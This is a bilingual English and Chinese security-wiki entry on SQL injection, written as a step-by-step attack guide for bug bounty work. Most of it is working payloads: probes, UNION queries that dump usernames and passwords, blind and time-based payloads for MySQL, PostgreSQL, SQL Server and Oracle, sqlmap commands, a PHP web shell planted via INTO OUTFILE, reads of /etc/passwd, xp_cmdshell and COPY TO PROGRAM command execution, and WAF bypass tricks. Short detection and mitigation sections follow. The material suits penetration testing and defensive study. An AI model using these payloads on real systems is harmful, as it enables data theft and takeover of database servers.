---
id: sqli-sql-injection
title_en: SQL Injection
title_zh: SQL 注入
summary_en: Injection still pays. The modern work is not dumping a database with UNION, it is finding the one value nobody parameterised — usually in a report filter, an ORDER BY clause, or a legacy endpoint the new API was supposed to replace.
summary_zh: SQL 注入依然有肉。现在的工作重点不是用 UNION 拖库，而是找出那个没人做参数化的值 —— 往往藏在报表筛选、ORDER BY 子句，或者本该被新接口取代却还在跑的旧路由里。
tags: [web, sqli, injection, database, bugbounty, waf-bypass]
tools: [sqlmap, Burp Suite, ffuf]
attck: [T1190]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### What the bug actually is

The application builds a query by pasting user input into it. Whatever you type becomes part of the SQL, and SQL cannot tell data from code. One unescaped quote is enough to leave the string you were supposed to be inside:

```sql
-- intended
SELECT * FROM products WHERE name = 'widget'
-- you sent:  widget' OR '1'='1
SELECT * FROM products WHERE name = 'widget' OR '1'='1'
```

Everything after that is ordinary SQL, and the database will happily do whatever you ask. Parameterised queries (prepared statements) fix it completely, which is why this bug is almost always found in code written by hand: string concatenation in a report builder, an ORM escape hatch, an `ORDER BY` that binds a column name, or a search feature bolted on later.

Places where binding *cannot* be used are the richest hunting ground, because the developer had to concatenate:

- `ORDER BY` column names and `ASC`/`DESC` — frequently taken straight from a query parameter.
- Table or column names, `LIMIT`/`OFFSET` in some drivers.
- The `IN (...)` list, built by joining strings.
- Stored procedure names, dynamic SQL inside the database.

### Step 1 — Find the parameter

Do not just fuzz the main search box. Every value that reaches a query is a candidate:

- JSON and XML fields, including ones the UI never shows (mass assignment-adjacent).
- Sort and filter parameters (`sort=`, `order=`, `dir=`, `filter[status]=`).
- Hidden form fields and "advanced search" panels.
- Cookie and header values that end up in an audit log or a session lookup.
- Numeric path segments: `/api/orders/1042` — the `1042` is often concatenated.

Cheap probes, in order of what they tell you:

| Payload | What a difference means |
|---|---|
| `'` then `''` | A single quote errors, a doubled quote does not → you are inside a string. |
| `1' AND '1'='1` vs `1' AND '1'='2` | Different results → boolean injection. |
| `1' ORDER BY 1-- -` incrementing the number | Errors at some N → column count. |
| `1' UNION SELECT NULL-- -` adding NULLs | Errors until the count matches → column count too. |
| `1' AND SLEEP(5)-- -` | A five second delay → time-based blind. |
| `1' AND 1=CONVERT(int,@@version)-- -` | Error text leaking the version → error-based. |

### Step 2 — Classify it

| Class | Signal | Extraction |
|---|---|---|
| In-band, UNION | Query output is visible on the page | Direct: `UNION SELECT` |
| Error-based | Database errors reflected | Convert data into an error message |
| Blind boolean | Page differs true/false, no output | One bit per request, scripted |
| Blind time | Only timing differs | `SLEEP`/`pg_sleep`/`WAITFOR DELAY` |
| Out-of-band | No output, no timing (rare) | DNS/HTTP via database functions |

Time-based is the workhorse on modern targets: it survives output encoding, and it is what you fall back to when the response looks identical either way.

### Step 3 — UNION-based extraction, when you are lucky

```sql
-- 1. find the column count
1' ORDER BY 5-- -        -- error means fewer than 5
1' UNION SELECT NULL,NULL,NULL-- -   -- works when the count matches

-- 2. find which columns are printed
1' UNION SELECT 'a',NULL,NULL-- -

-- 3. fingerprint, then read
1' UNION SELECT @@version,user(),database()-- -
1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
1' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
1' UNION SELECT username,password,NULL FROM users-- -
```

MySQL and PostgreSQL both expose `information_schema`. On SQL Server use `sysobjects`/`sys.columns`; on Oracle the `all_tables`/`all_tab_columns` views. The mechanics differ, the approach does not.

### Step 4 — When you cannot see anything

Boolean, one bit at a time:

```sql
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

Time-based, which needs no output at all:

```sql
-- MySQL / MariaDB
1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
-- PostgreSQL
1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -
-- SQL Server
1'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
-- Oracle
1' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END FROM dual)-- -
```

Automate the boring part — `sqlmap` is very good at exactly this:

```bash
# start narrow, tell it what you know
sqlmap -u 'https://target/item?id=1' --batch --level=3 --risk=2

# a POST body, with a session cookie
sqlmap -u 'https://target/api/search' --data='{"q":"x"}' \
       --headers='Content-Type: application/json' --cookie='session=...' -p q

# time-based only, when the page never changes
sqlmap -u 'https://target/item?id=1' --technique=T --dbms=mysql --batch
```

Do not point `--risk=3` at production: it enables payloads that can damage data.

### Step 5 — From read to write to code

Reading is the finding; writing is the impact that gets the report escalated:

```sql
-- write a file (MySQL, FILE privilege, secure_file_priv allows it)
1' UNION SELECT '<?php system($_GET["c"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/s.php'-- -

-- read a file
1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -

-- SQL Server: command execution
1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'-- -

-- PostgreSQL: command execution as the database user
1'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out';-- -
```

The database service often runs as a privileged user on the host, so "we got SQL injection" and "we got a shell on the database server" are frequently the same finding with one more step. Even read-only access is serious when the table is `users` and the column is `password_hash`.

### When there is a WAF

A WAF changes the payload, not the bug. Things that still work often:

- Comments and whitespace: `/**/`, `/*!50000UNION*/`, `%09`, `%0a`, `+`.
- Case and keyword substitution: `UnIoN SeLeCt`, `||` instead of `OR`, `&&` for `AND`.
- Encoding: URL, double-URL, unicode, hex literals (`0x61646d696e` instead of `'admin'`).
- Chunked transfer encoding and parameter pollution, when the WAF and the backend disagree about how to parse the request.
- Sending the payload in a place the WAF does not inspect: a JSON field the rule does not cover, a header that reaches the query, a cookie.

Test the injection with a benign proof (`SLEEP`, or `AND 1=1`) rather than a destructive one, and confirm what you found with a second technique. A WAF bypass that only fires once is usually a false positive.

### Second-order and stacked queries

**Second-order** injection is stored, not reflected: you register a username containing a payload, and the injection executes later when an admin page builds a query with that stored value. Test every place input is *reused*, not just where it is submitted.

**Stacked queries** (`;` followed by another statement) depend on the driver: SQL Server and PostgreSQL often allow them, MySQL usually not through the common APIs. When they work, they turn read access into `UPDATE`/`DROP`/command execution.

### Detection

- Database errors in responses, or sudden 500s on input that used to work.
- Query time outliers — time-based injection is visible in database slow logs.
- `information_schema` in query text; `UNION SELECT` in logs from a normal application user.
- Alerts are strongest at the database layer: a legitimate endpoint should never run `UNION`, and almost never touches `information_schema`.

### Mitigation

- **Parameterised queries everywhere**, including `ORDER BY` (whitelist the column name, never bind it from a raw string).
- **Least privilege for the application account**: no `FILE`, no `xp_cmdshell`, no `COPY TO PROGRAM`, no DDL. A read-only account that can only `SELECT` from the tables it needs turns a critical finding into a contained one.
- **Do not rely on escaping or on the WAF.** Escaping is easy to get subtly wrong; the WAF is a speed bump and a log source, not a control.
- **Turn off detailed errors in production** and log them server-side instead.
- **Stored procedures with dynamic SQL inside** need the same parameterisation as application code; they are a common blind spot.
- **Add the injection test to CI** — a lint rule that flags string concatenation into query builders catches the next one.

<!-- lang:zh -->
### 这个漏洞到底是什么

应用把用户输入拼进了查询。你输入的任何东西都会成为 SQL 的一部分，而 SQL 分不清数据和代码。一个没转义的单引号，就足以让你从本该被关住的字符串里走出去：

```sql
-- 原本的意图
SELECT * FROM products WHERE name = 'widget'
-- 你发送的是： widget' OR '1'='1
SELECT * FROM products WHERE name = 'widget' OR '1'='1'
```

后面的一切都是普通 SQL，数据库会照做不误。参数化查询（预编译语句）能彻底根治，所以这个漏洞几乎总是出现在手写代码里：报表构造器里的字符串拼接、ORM 的逃生舱、把列名绑定进去的 `ORDER BY`、后加上的搜索功能。

**无法使用绑定**的地方是收获最丰的猎场，因为开发者只能拼接：

- `ORDER BY` 的列名和 `ASC`/`DESC` —— 经常直接取自查询参数。
- 表名、列名，某些驱动里的 `LIMIT`/`OFFSET`。
- `IN (...)` 列表，靠字符串拼接生成。
- 存储过程名，以及数据库内部的动态 SQL。

### 第一步 —— 找到参数

别只盯着主搜索框。每一个会进入查询的值都是候选：

- JSON 与 XML 字段，包括界面上永远不显示的那些（与批量赋值相邻的问题）。
- 排序与筛选参数（`sort=`、`order=`、`dir=`、`filter[status]=`）。
- 隐藏表单字段和「高级搜索」面板。
- 会写进审计日志或用于会话查询的 Cookie 与请求头。
- 数字路径段：`/api/orders/1042` —— 那个 `1042` 往往就是拼进去的。

几个便宜的探针，按它们能告诉你的信息排序：

| Payload | 出现差异意味着 |
|---|---|
| 先 `'` 再 `''` | 单个引号报错、双引号不报错 → 你在字符串里。 |
| `1' AND '1'='1` 对比 `1' AND '1'='2` | 结果不同 → 布尔注入。 |
| `1' ORDER BY 1-- -` 递增数字 | 到某个 N 报错 → 列数。 |
| `1' UNION SELECT NULL-- -` 递增 NULL | 直到数量对上才不报错 → 也是列数。 |
| `1' AND SLEEP(5)-- -` | 延迟五秒 → 时间盲注。 |
| `1' AND 1=CONVERT(int,@@version)-- -` | 报错里带出版本 → 报错注入。 |

### 第二步 —— 分类

| 类型 | 特征 | 取数方式 |
|---|---|---|
| 联合查询（in-band） | 查询结果会显示在页面上 | 直接 `UNION SELECT` |
| 报错注入 | 数据库错误被回显 | 把数据转换成错误信息 |
| 布尔盲注 | 真假两态页面不同，无回显 | 一次请求一个比特，脚本化 |
| 时间盲注 | 只有耗时不同 | `SLEEP`/`pg_sleep`/`WAITFOR DELAY` |
| 带外（OOB） | 无回显、无时间差（少见） | 通过数据库函数发 DNS/HTTP |

时间盲注是现代目标上的主力：它能扛过输出编码，而且是你在两种响应看起来一模一样时的兜底手段。

### 第三步 —— 运气好时的联合查询取数

```sql
-- 1. 先找列数
1' ORDER BY 5-- -        -- 报错说明不到 5 列
1' UNION SELECT NULL,NULL,NULL-- -   -- 数量对上就成功

-- 2. 找出哪一列会显示
1' UNION SELECT 'a',NULL,NULL-- -

-- 3. 指纹识别，然后读数据
1' UNION SELECT @@version,user(),database()-- -
1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
1' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
1' UNION SELECT username,password,NULL FROM users-- -
```

MySQL 和 PostgreSQL 都有 `information_schema`。SQL Server 用 `sysobjects`/`sys.columns`，Oracle 用 `all_tables`/`all_tab_columns` 视图。机制不同，思路一样。

### 第四步 —— 什么都看不见的时候

布尔盲注，一次一个比特：

```sql
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

时间盲注，完全不需要回显：

```sql
-- MySQL / MariaDB
1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
-- PostgreSQL
1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -
-- SQL Server
1'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
-- Oracle
1' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END FROM dual)-- -
```

把枯燥的部分自动化 —— `sqlmap` 正是干这个的：

```bash
# 从窄开始，把你已知的信息告诉它
sqlmap -u 'https://target/item?id=1' --batch --level=3 --risk=2

# POST 请求体，带会话 Cookie
sqlmap -u 'https://target/api/search' --data='{"q":"x"}' \
       --headers='Content-Type: application/json' --cookie='session=...' -p q

# 页面永远不变时，只用时间盲注
sqlmap -u 'https://target/item?id=1' --technique=T --dbms=mysql --batch
```

别对生产环境用 `--risk=3`：它会启用可能损坏数据的 payload。

### 第五步 —— 从读到写再到代码执行

读到数据本身就是发现；写能力才是让报告升级的影响：

```sql
-- 写文件（MySQL，有 FILE 权限且 secure_file_priv 允许）
1' UNION SELECT '<?php system($_GET["c"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/s.php'-- -

-- 读文件
1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -

-- SQL Server：命令执行
1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'-- -

-- PostgreSQL：以数据库用户身份执行命令
1'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out';-- -
```

数据库服务在主机上往往以高权限用户运行，所以「我们拿到了 SQL 注入」和「我们拿到了数据库服务器上的 shell」经常只差一步。即便只是只读，当那张表叫 `users`、那一列叫 `password_hash` 时，同样是严重问题。

### 有 WAF 的时候

WAF 改变的是 payload，不是漏洞。下面这些通常仍然有效：

- 注释与空白：`/**/`、`/*!50000UNION*/`、`%09`、`%0a`、`+`。
- 大小写与关键字替换：`UnIoN SeLeCt`，用 `||` 代替 `OR`，`&&` 代替 `AND`。
- 编码：URL、双重 URL、unicode、十六进制字面量（用 `0x61646d696e` 代替 `'admin'`）。
- 分块传输编码与参数污染 —— 当 WAF 与后端对请求的解析方式不一致时。
- 把 payload 放到 WAF 不检查的地方：规则没覆盖的 JSON 字段、能进入查询的请求头、Cookie。

用无害的证明（`SLEEP`，或者 `AND 1=1`）而不是破坏性的语句来验证，并且用第二种技术交叉确认。只触发一次的 WAF 绕过，通常是误报。

### 二阶注入与堆叠查询

**二阶注入**是存起来的，不是回显的：你注册一个带 payload 的用户名，之后管理员页面用这个存下来的值构造查询时才触发。要测每一个**复用**输入的地方，而不只是提交的地方。

**堆叠查询**（`;` 后跟另一条语句）取决于驱动：SQL Server 和 PostgreSQL 常常允许，MySQL 通过常见 API 通常不行。一旦可行，它就把读权限变成 `UPDATE`/`DROP`/命令执行。

### 检测

- 响应里出现数据库错误，或者原本正常的输入突然 500。
- 查询耗时离群 —— 时间盲注在数据库慢日志里很明显。
- 查询文本里出现 `information_schema`；普通应用用户发出 `UNION SELECT`。
- 最强的告警点在数据库层：一个正常接口永远不该跑 `UNION`，也几乎不会去碰 `information_schema`。

### 缓解

- **全部使用参数化查询**，包括 `ORDER BY`（列名走白名单，绝不要从原始字符串绑定）。
- **应用账号最小权限**：不要 `FILE`、不要 `xp_cmdshell`、不要 `COPY TO PROGRAM`、不要 DDL。一个只能 `SELECT` 它需要的那几张表的只读账号，会把一个高危发现变成受控事件。
- **不要依赖转义，也不要依赖 WAF。** 转义很容易在细节上出错；WAF 是减速带和日志源，不是控制措施。
- **生产环境关闭详细报错**，改在服务端记录。
- **存储过程内部的动态 SQL** 需要和应用代码同等程度的参数化，这是常见的盲区。
- **把注入测试放进 CI** —— 一条能标出「字符串拼接进查询构造器」的 lint 规则，就能拦住下一个。
